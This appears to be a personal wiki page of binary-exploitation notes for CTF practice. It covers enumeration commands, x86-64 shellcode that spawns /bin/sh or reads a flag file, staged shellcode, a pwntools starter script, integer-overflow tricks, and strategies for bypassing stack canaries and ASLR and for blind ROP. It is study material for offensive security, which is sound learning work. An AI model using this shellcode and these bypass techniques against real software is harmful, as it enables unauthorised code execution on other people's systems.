Navigation: [[Directory]]

---
## Table of Contents
1. Tooling List
2. Initial enumeration
3. Basic Attacks
4. Stack Protections
5. Return Oriented Programming
6. Heap Exploitation
7. 
## Tooling List
1. [PwnTools](https://github.com/Gallopsled/pwntools)
2. [PwnDBG](https://github.com/pwndbg/pwndbg)
## Initial Enumeration
Checking the security configuration of a file:
```
checksec --file=<file>
```

We can disassemble and dump an entire program by using
```
objdump -M intel -d <program>
```

We can dump addresses using
```
nm -a <program>
```

## Basic Attacks
#### Building Shellcode
Shellcode to spawn a shell:
``` assembly
.globl _start
_start:
.intel_syntax noprefix
	mov rax, 59            # syscall number of execve
	lea rdi, [rip+binsh]   # "/bin/sh"
	mov rsi, 0             # NULL
	mov rdx, 0             # NULL
	syscall                # execve("/bin/sh", NULL, NULL)
binsh:
	.string "/bin/sh"
```

Shellcode to read a flag file:
```assembly
.globl _start
_start:
.intel_syntax noprefix
	mov rbx, 0x00000067616c662f # push "/flag" filename
	push rbx
	
	mov rax, 2    # syscall number of open
	mov rdi, rsp  # point to /flag
	mov rsi, 0    # NULL out the second argument (meaning, O_RDONLY)
	syscall       # open("/flag", NULL)
	
	mov rdi, 1    # stdout
	mov rsi, rax  # file descriptor of open
	mov rdx, 0    # offset
	mov r10, 1000 # number of bytes to read
	mov rax, 40   # syscall number of sendfile
	syscall       # sendfile(1, fd, 0, 1000)

    mov rax, 60   # syscall number of exit
    syscall       # exit()
```

Staged shellcode (amd64 syntax):
```assembly
.globl _start
_start:
.intel_syntax noprefix
	mov rax, 0      # sycall number of read
	mov rdi, 0      # stdin
	mov rsi, [rsi]  # instruction pointer
	mov rdx, 1000   # 1000 bytes
	syscall         # read(0, rip, 1000)
```

Then assemble and dump the raw bytes (works for x86, x64, and amd64):
```sh
gcc -nostdlib -static shellcode.s -o shellcode-elf

objcopy --dump-section .text=shellcode-raw shellcode-elf
```

To test run the shellcode:
```shell
gcc -nostdlib -static shellcode.s -o shellcode-elf  
./shellcode-elf
```

To view the shellcode:
```shell
objdump -M intel -d shellcode-elf
```

Sometimes when there are great constraints against your injection, you can use staged shellcode.

When writing shellcode, start with what you want your shellcode to look like when it's executed. Then work backwards. It may be mangled, encrypted, compressed, etc. by a program.
#### Shellcode Injection
Allows attacker to arbitrarily inject and run code into a program. Shellcode is injected onto the stack and the instruction pointer is overwritten to point to the shellcode.

Starter pwntools script:
```python
from pwn import *
r = pwn.gdb.debug("./file")
r = pwn.process("./file")
pwn.send(cyclic(128)) # send 128 cyclical bytes
pwn.cyclic_find("pattern") # finds the pattern that caused the overflow
pwn.p64("addr") # converts an address to a bytes like object
r.readall() # reads output bytes
```
#### Integer Overflow
In C, signed and unsigned integers are used. Signed integers are represented as two's complement, whereas unsigned integers simply use the binary associated with the value. Knowing this, sometimes a signed value may be cast into an unsigned function. Let's look at a very simple example:
```C
var = -1;
read (file, buf, input);
```

The read function in reality takes an unsigned integer. Passing -1 to it (`0xffffffff`) would result in the max 32 bit integer of bytes being read instead. We can use this to exploit specific checks, here's an example of the following:
```C
buf[100];
if (buffer_count * unsigned length < 7)
	read (file, buf, buffer_count);
```

To exploit this, we need the unsigned buffer count multiplied by length to be less than 7 unsigned. To achieve this, we'd need the value of the operation to be `4294967297`. Given we need `buffer_count` to achieve a buffer overflow,  we can use the values 641 and 6700417. This allows us to overflow the variable `buf`.


#### Overcoming Shellcode Protections
**Program Skipping a Randomized Number of Bytes**
Use a NOP sled

**Identifying and Removing Bad Characters**
https://medium.com/@notsoshant/windows-exploitation-dealing-with-bad-characters-quickzip-exploit-472db5251ca6

Can use ChatGPT to remove bad bytes too.
###### Staging Payloads
https://compilepeace.medium.com/shellcoding-0x3-dropping-multi-stage-payload-fdd635fcbf70
###### Self Modifying Shellcode
https://nets.ec/Shellcode/Self-modifying
https://www.exploit-db.com/docs/english/13127-writing-self-modifying-code-andutilizing-advanced-assembly-techniques.pdf
https://blog.idiot.sg/2019-02-03/nullcon-hackim-ctf-2019/
https://cov-comsec.github.io/posts/2021_assembly_and_shellcoding_walkthrough/
###### Bypassing Syscall Filters
https://anee.me/bypassing-syscall-filters-735b41283cf9
https://www.reddit.com/r/asm/comments/zngoig/self_modify_assembly_code/

## Stack Protection
#### General Readings
[Stack overflow answer on ASLR, NX, and canaries](https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx)

#### Stack Canaries
A value is set at the start of a function. The value is checked again at the end of verify that a buffer overflow hasn't occured.

In a function, the ending should look like:
1. Moving a value from a pointer
2. Comparing it to another
3. Jumping or calling `stack_check_fail` depending on the value

To overcome stack canaries, we can:
-  Leak the canary using another vulnerability
-  Brute force the canary if the process forks (usually for network and android)
   - This involves finding a buffer that gets to the canary, then brute forces bytes until the canary value is overwritten to the correct value
-  Jump the canary if possible
-  Overwrite `i` and read to the point after the canary
#### Non-Executable Stack
#### Address Space Location Randomization
Randomize locations of code and data in memory

To overcome ASLR, we can:
- Leak the memory addresses
- Overwrite the page offset, requires brute force
- Other brute force methods

#### Position Independent Code/Execution
## Return Oriented Programming
Allows you to chain together "gadgets", which are small sets of instructions followed by a `ret` call, in order to subvert the control flow of a program. 

Here's how we can find gadgets:
https://github.com/0vercl0k/rp

It's pivotal to know your stack layout in ROP. Ensure that you understand what values are currently on the stack and utilize them.

A standard blind ROP follows this control flow (requires a program that forks):
1. Break ASLR and canary byte-by-byte
2. Redirect memory until there's a survival signal (non-crashing address)
3. Use survival signal to find non-crashing ROP gadgets
4. Find functionality to produce output
5. Leak program
6. ROP

https://www.scs.stanford.edu/brop/bittau-brop.pdf

## Heap Exploitation


---
Navigation: [[Directory]]